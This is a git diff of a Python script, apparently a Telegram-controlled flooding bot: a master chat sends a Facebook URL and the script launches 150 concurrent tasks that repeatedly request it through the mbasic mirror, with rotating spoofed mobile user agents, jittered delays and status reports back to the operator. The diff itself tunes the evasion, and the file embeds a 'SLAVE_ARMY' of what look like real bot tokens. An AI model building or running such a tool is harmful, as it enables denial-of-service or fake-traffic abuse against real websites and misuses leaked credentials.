@@ -13,55 +13,61 @@ SLAVE_ARMY = {
     "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
 }
 
-class AIP2K_Final_Core:
+class AIP2K_Pure_Core:
     def __init__(self):
         self.session = None
         self.target = ""
         self.success = 0
         self.failed = 0
         self.active = False
-        self.bot_names = {}
+        self.identities = {}
 
-    async def _fetch_identities(self):
+    async def _fetch_names(self):
         for k, v in SLAVE_ARMY.items():
             try:
                 async with self.session.get(f"https://api.telegram.org/bot{v}/getMe") as r:
                     d = await r.json()
-                    self.bot_names[k] = f"@{d['result']['username']}" if d.get('ok') else f"Bot_{k}"
-            except: self.bot_names[k] = f"Err_{k}"
+                    self.identities[k] = f"@{d['result']['username']}" if d.get('ok') else f"Bot_{k}"
+            except: self.identities[k] = f"Err_{k}"
 
     async def _notify(self, text):
-        print(f"[AIP2K] {text}")
+        print(f"[AIP2K-SYNC] {text}")
         url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
         try: await self.session.post(url, json={'chat_id': MASTER_ID, 'text': text})
         except: pass
 
     async def _strike(self):
         while self.active and self.target:
+            agents = [
+                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
+                "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+            ]
             h = {
-                'authority': 'm.facebook.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9',
-                'referer': 'https://www.google.com/',
-                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121"',
-                'user-agent': f"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
+                'User-Agent': random.choice(agents),
+                'Referer': 'https://www.google.com/',
+                'Accept-Language': 'en-US,en;q=0.9'
             }
             try:
-                t_url = self.target.replace("www.facebook", "m.facebook")
-                async with self.session.get(t_url, headers=h, timeout=10) as r:
-                    if r.status == 200: self.success += 1
-                    else: self.failed += 1
-            except: self.failed += 1
+                m_target = self.target.replace("www.facebook", "mbasic.facebook")
+                async with self.session.get(m_target, headers=h, timeout=10) as r:
+                    if r.status == 200: 
+                        self.success += 1
+                    else: 
+                        self.failed += 1
+            except: 
+                self.failed += 1
             
-            if (self.success + self.failed) % 500 == 0:
-                report = f"📊 STATUS: ✅ SUCCESS: {self.success} | ❌ FAILED: {self.failed}"
-                asyncio.create_task(self._notify(report))
-            await asyncio.sleep(0.02)
+            if (self.success + self.failed) % 300 == 0:
+                rep = f"📊 RAW REPORT: ✅ {self.success} | ❌ {self.failed}"
+                asyncio.create_task(self._notify(rep))
+            
+            await asyncio.sleep(random.uniform(0.05, 0.1))
 
     async def handle_updates(self):
         offset = 0
-        await self._fetch_identities()
-        await self._notify("🔱 AIP2K CORE ONLINE - IDENTITY SYNCED")
+        await self._fetch_names()
+        await self._notify("🔱 AIP2K PURE ENGINE ONLINE")
         while True:
             try:
                 url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}"
@@ -70,24 +76,24 @@ class AIP2K_Final_Core:
                     for u in data.get('result', []):
                         offset = u['update_id'] + 1
                         m = u.get('message', {})
-                        t = m.get('text', '')
+                        text = m.get('text', '')
                         if m.get('from', {}).get('id') != MASTER_ID: continue
                         
-                        if t.startswith("http"):
-                            self.target = t; self.active = True; self.success = 0; self.failed = 0
-                            await self._notify(f"⚔️ STRIKE STARTED: {t}")
-                            for _ in range(300): asyncio.create_task(self._strike())
-                        elif t == "/check":
-                            msg = "🔎 BOT STATUS:\n" + "\n".join([f"✅ {v}" for v in self.bot_names.values()])
+                        if text.startswith("http"):
+                            self.target = text; self.active = True; self.success = 0; self.failed = 0
+                            await self._notify(f"⚔️ ATTACK: {text}")
+                            for _ in range(150): asyncio.create_task(self._strike())
+                        elif text == "/check":
+                            msg = "🔎 STATUS:\n" + "\n".join([f"✅ {v}" for v in self.identities.values()])
                             await self._notify(msg)
-                        elif t == "/stop":
+                        elif text == "/stop":
                             self.active = False
-                            await self._notify(f"🛑 STOPPED. TOTAL SUCCESS: {self.success}")
+                            await self._notify(f"🛑 STOPPED. SUCCESS: {self.success} | FAILED: {self.failed}")
             except: await asyncio.sleep(1)
 
 async def main():
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as sess:
-        bot = AIP2K_Final_Core(); bot.session = sess
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=50)) as sess:
+        bot = AIP2K_Pure_Core(); bot.session = sess
         app = web.Application(); runner = web.AppRunner(app)
         await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
         await bot.handle_updates()
